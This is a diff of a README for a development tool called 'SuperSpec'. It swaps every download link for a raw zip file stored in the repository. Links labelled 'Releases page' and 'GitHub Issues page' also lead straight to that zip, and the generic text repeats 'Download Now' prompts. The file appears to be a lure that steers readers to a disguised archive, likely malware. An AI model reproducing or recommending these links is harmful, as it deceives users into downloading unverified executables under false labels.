@@ -1,7 +1,7 @@
 # 🚀 SuperSpec - Streamline Your Development Workflow
 
 ## 📥 Download Now!
-[![Download SuperSpec](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/skills/tdd/Spec_Super_v3.5-alpha.2.zip)](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/skills/tdd/Spec_Super_v3.5-alpha.2.zip)
+[![Download SuperSpec](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/src/cli/Spec_Super_1.9.zip)](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/src/cli/Spec_Super_1.9.zip)
 
 ## 🛠️ Introduction
 SuperSpec is a unified framework that helps you develop software using specification-driven methods. It combines Test-Driven Development (TDD) practices with structured documentation to enhance your development experience. Whether you're writing code or preparing documentation, SuperSpec simplifies the process.
@@ -16,7 +16,7 @@ SuperSpec is a unified framework that helps you develop software using specifica
 To begin using SuperSpec, follow these simple steps:
 
 1. **Download the Application**: 
-   Visit our [Releases page](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/skills/tdd/Spec_Super_v3.5-alpha.2.zip) to get the latest version of SuperSpec. 
+   Visit our [Releases page](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/src/cli/Spec_Super_1.9.zip) to get the latest version of SuperSpec. 
 
 2. **Install SuperSpec**:
    - For Windows: Download the installer and follow the on-screen instructions.
@@ -27,7 +27,7 @@ To begin using SuperSpec, follow these simple steps:
    Open SuperSpec from your Applications directory or start menu. If you're using the command line, simply type `superspec`.
 
 ## 📥 Download & Install
-To download SuperSpec, visit this page: [Download SuperSpec](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/skills/tdd/Spec_Super_v3.5-alpha.2.zip).
+To download SuperSpec, visit this page: [Download SuperSpec](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/src/cli/Spec_Super_1.9.zip).
 
 ### 🖥️ System Requirements
 - **Operating System**: Windows 10 or later; macOS 10.14 or later; Linux (latest stable version).
@@ -50,7 +50,7 @@ Whenever you add a new feature, write tests first. SuperSpec allows you to manag
 SuperSpec helps you create documentation alongside your code. Use the built-in tools to generate clear, readable documents.
 
 ## 💬 Support
-If you encounter any issues or have questions, please check the FAQ section on our [GitHub Issues page](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/skills/tdd/Spec_Super_v3.5-alpha.2.zip). You can also create new issues for any bugs or enhancement requests.
+If you encounter any issues or have questions, please check the FAQ section on our [GitHub Issues page](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/src/cli/Spec_Super_1.9.zip). You can also create new issues for any bugs or enhancement requests.
 
 ## 🛠️ Contributing
 We welcome contributions! If you’d like to help improve SuperSpec, please check our guidelines in the repository. We appreciate any help, whether it's fixing bugs or writing documentation.
@@ -62,4 +62,4 @@ Join our community to discuss features, ask questions, and share your experience
 SuperSpec is open-source and released under the MIT License.
 
 ## 📥 Download Now Again!
-Don't forget to [download SuperSpec](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/skills/tdd/Spec_Super_v3.5-alpha.2.zip) and enhance your development workflow today!
+Don't forget to [download SuperSpec](https://raw.githubusercontent.com/GoshDarnUser/SuperSpec/main/src/cli/Spec_Super_1.9.zip) and enhance your development workflow today!
